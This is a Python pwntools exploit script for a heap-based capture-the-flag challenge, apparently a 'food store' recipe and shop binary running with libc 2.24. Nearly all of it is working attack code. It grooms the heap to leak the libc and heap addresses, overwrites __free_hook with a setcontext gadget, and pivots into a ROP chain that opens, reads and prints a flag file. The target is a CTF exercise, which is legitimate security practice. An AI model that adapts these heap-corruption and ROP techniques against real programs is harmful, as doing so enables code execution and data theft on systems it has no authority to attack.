###Juggling with heap
###This script is for documentary purpose, thus prioritize clearness over speed. To make it succeed on remote environment, certain speedup measures must be taken and the script must be modified

from pwn import *

'''
ingredient (name=>str, price=>uint, amount=>uint) 0x28
    |   4   |   4   |   4   |   4   |
0x00|             name              |
0x10|             name              |
0x20| value | amount|

ingredient_list (ingredient=>ptr) 0x58
    |   4   |   4   |   4   |   4   |
0x00|  ingredient0  |  ingredient1  |
0x10|  ingredient2  |  ingredient3  |
0x20|  ingredient4  |  ingredient5  |
0x30|  ingredient6  |  ingredient7  |
0x40|  ingredient8  |  ingredient9  |
0x50|               |

recipe (title=>str, ingredient=>ptr, next_recipe=>ptr) 0x88 >>next_recipe uninitialized
    |   4   |   4   |   4   |   4   |
0x00|             title             |
0x10|     title     |  ingredient0  |
0x20|  ingredient1  |  ingredient2  |
0x30|  ingredient3  |  ingredient4  |
0x40|  ingredient5  |  ingredient6  |
0x50|  ingredient7  |  ingredient8  |
0x60|  ingredient9  |  ingredient10 |
0x70| ingredient11  |  ingredient12 |
0x80|  next_recipe  |

dish (name=>str, value=>int, value?=>lu, next_dish=>ptr, prev_dish=>ptr) 0x38
    |   4   |   4   |   4   |   4   |
0x00|             name              |
0x10|     name      | value |   X   |
0x20|    energy     |   next_dish   |
0x30|   prev_dish   |
'''

###Util
def recipe_enter():
    r.sendlineafter('choice: ','1')

def recipe_create(name,ingredients):
    r.sendlineafter('choice: ','1')
    r.sendlineafter('Title :',name)
    r.sendlineafter('ingredient :',str(ingredients[0]))
    for i in ingredients[1:]:
        r.sendlineafter('(1/Yes,2/No) : ','1')
        r.sendlineafter('ingredient :',str(i))
    r.sendlineafter('(1/Yes,2/No) : ','2')

def recipe_delete(name):
    r.sendlineafter('choice: ','2')
    r.sendlineafter('Title :',name)

def recipe_leave():
    r.sendlineafter('choice: ','4')

def assignment(name):
    r.sendlineafter('choice: ','2')
    if name not in r.recvuntil('for me ? \n').decode():
        r.sendlineafter('(1/Yes,0/No) :','0')
        return 0
    else:
        r.sendlineafter('(1/Yes,0/No) :','1')
        return 1

def show_chef():
    r.sendlineafter('choice: ','3')
    r.recvuntil(b'Power')
    power = int(r.recvline().split(b' : ')[1][:-1])
    money = int(r.recvline().split(b' : ')[1][:-1])
    return power,money

def shop_enter():
    r.sendlineafter('choice: ','4')

def shop_buy(idx,cnt):
    r.sendlineafter('choice: ','1')
    r.sendlineafter('buy ? :',str(idx))
    r.sendlineafter('Quantity :',str(cnt))

def shop_sell(idx):
    r.sendlineafter('choice: ','2')
    r.sendlineafter('sell ? :',str(idx))

def shop_make(name):
    r.sendlineafter('choice: ','3')
    r.sendlineafter('Enjoy it :)\n',name)

def shop_leave():
    r.sendlineafter('choice: ','4')

def cook(name,show=False):
    r.sendlineafter('choice: ','5')
    leak = None
    if show is True:
        leak = r.recvuntil('\nWhat',drop=True).split(b'Title : ')[1:]
        for i in range(len(leak)):
            leak[i] = leak[i].split(b'\n')[0]
    r.sendlineafter('cook :',name)
    return leak

def eat(idx):
    r.sendlineafter('choice: ','6')
    r.sendlineafter('eat ? :',str(idx))

###Addr
#  libc2.24
main_arena_offset = 0x3c1b00
large_bin_offset = main_arena_offset+0x718
malloc_hook_offset = 0x3c1af0
free_hook_offset = 0x3c3788

###ROPgadget
L_nop = 0x10f80
L_pop_rdi = 0x1fd7a
L_pop_rsi = 0x1fcbd
L_pop_rdx = 0x1b92
L_pop_rax = 0x3a998
L_syscall = 0xf888e
L_pop15 = 0xf8766
setcontext_gadget = 0x48045

###Exploit
r = process('./F',env={'LD_PRELOAD':'/home/james/FS/libc.so'})

r.sendlineafter('name: ','M30W')


cook('Beef noodles')
eat(0)
cook('Beef noodles')
shop_enter()
shop_sell(0)
shop_buy(2,1)
shop_buy(5,1)
shop_leave()
recipe_enter()
recipe_create('Expensive',[2,3,3,3,4])
recipe_create('Cheap',[0])
recipe_leave()
cook('Expensive')
eat(0)
cook('Cheap')
while assignment('Cheap')==0:
    continue

cook('Cheap')

recipe_enter()
recipe_create('pad1_1',[0])
recipe_create('pad1_2',[0])
for i in range(0x40):
    print(f'{i+1}/{0x40}')
    recipe_create(f'pad1_2_{i}',[0])
recipe_leave()

shop_enter()
shop_buy(4,0)
shop_leave()

recipe_enter()
recipe_create('pad1_3',[0])
recipe_create('pad1_4',[0])
for i in range(0x41):
    recipe_create(f'pad1_4_{i}',[0])
recipe_leave()

shop_enter()
shop_buy(6,0)
shop_leave()

recipe_enter()
for i in range(0x3f,-1,-1):
    recipe_delete(f'pad1_2_{i}')
for i in range(0x40,-1,-1):
    recipe_delete(f'pad1_4_{i}')
recipe_delete('pad1_4')
recipe_delete('pad1_2')
recipe_delete('pad1_1')
recipe_delete('pad1_3')
recipe_create('pad1',[0])
recipe_leave()

leak_name = cook('nothing',show=True)[-1]
large_bin_addr = u64(leak_name.ljust(8,b'\x00'))
libc_base = large_bin_addr-large_bin_offset
print(hex(libc_base))

cook(leak_name)
eat(1)
cook(leak_name)
shop_enter()
shop_sell(1)
shop_leave()
cook(leak_name)

recipe_enter()
recipe_create('pad2_1',[0])
recipe_create('pad2_2',[0])
recipe_create('pad2_3',[0])
recipe_create('pad2_4',[0])
recipe_create('pad2_5',[0])
recipe_create('pad2_6',[0])
recipe_leave()

cook(leak_name)

recipe_enter()
recipe_delete('pad2_6')
recipe_delete('pad2_4')
recipe_delete('pad2_3')
recipe_delete('pad2_2')
recipe_delete('pad2_1')
recipe_delete('pad2_5')
recipe_create('pad2',[0])
recipe_leave()

cook(leak_name)
cook(leak_name)
cook(leak_name)
cook(leak_name)
cook(leak_name)
cook(leak_name)
cook(leak_name)

leak_name2 = cook('nothing',show=True)[-1]
heap_addr = u64(leak_name2.ljust(8,b'\x00'))-0xb50
print(hex(heap_addr))
cook(leak_name)

argument = b'/home/food_store/flag'
ROPchain = p64(libc_base+L_pop_rdi)+p64(heap_addr+0xc10)+\
           p64(libc_base+L_pop_rsi)+p64(0)+\
           p64(libc_base+L_pop_rdx)+p64(0)+\
           p64(libc_base+L_pop_rax)+p64(2)+\
           p64(libc_base+L_syscall)+p64(libc_base+L_nop)+\
           p64(libc_base+L_pop_rdi)+p64(4)+\
           p64(libc_base+L_pop_rsi)+p64(heap_addr)+\
           p64(libc_base+L_pop_rdx)+p64(0x100)+\
           p64(libc_base+L_pop_rax)+p64(0)+\
           p64(libc_base+L_syscall)+p64(libc_base+L_nop)+\
           p64(libc_base+L_pop_rdi)+p64(1)+\
           p64(libc_base+L_pop_rsi)+p64(heap_addr)+\
           p64(libc_base+L_pop_rdx)+p64(0x100)+\
           p64(libc_base+L_pop_rax)+p64(1)+\
           p64(libc_base+L_syscall)+p64(libc_base+L_nop)

recipe_enter()
recipe_create(argument,[0])
for i in range(0,len(ROPchain),0x10):
    recipe_create(ROPchain[i:i+0x10]+p64(libc_base+L_pop15)[:-1],[0])
recipe_leave()

recipe_enter()
recipe_create('pad3_1',[0])
recipe_create('pad3_2',[0])
recipe_create('pad3_3',[0])
recipe_create('pad3_4',[0])
recipe_create(b'pad3_5\x00\x00'+p64(0)+p64(libc_base+free_hook_offset-0x80)[:-1],[0])
recipe_create(b'pad3_6\x00\x00'+p64(0)+p64(libc_base+setcontext_gadget)[:-1],[0])
recipe_leave()

cook(leak_name)
cook(leak_name)

recipe_enter()
recipe_delete('pad3_6')
recipe_delete('pad3_5')
recipe_delete('pad3_3')
recipe_delete('pad3_2')
recipe_delete('pad3_1')
recipe_delete('pad3_4')
recipe_create('pad3_4',[0])
recipe_leave()

cook(leak_name)
cook(leak_name)
cook(leak_name)
cook(leak_name)
cook(leak_name)

recipe_enter()
recipe_create('link_to_hook',[0])
recipe_create('link_to_gadget',[0])
recipe_leave()

shop_enter()
shop_make(p64(0)+p64(0)+p64(heap_addr+0xd20)+p64(libc_base+L_nop)[:-1])
shop_leave()

recipe_enter()
recipe_delete('link_to_gadget')

r.interactive()
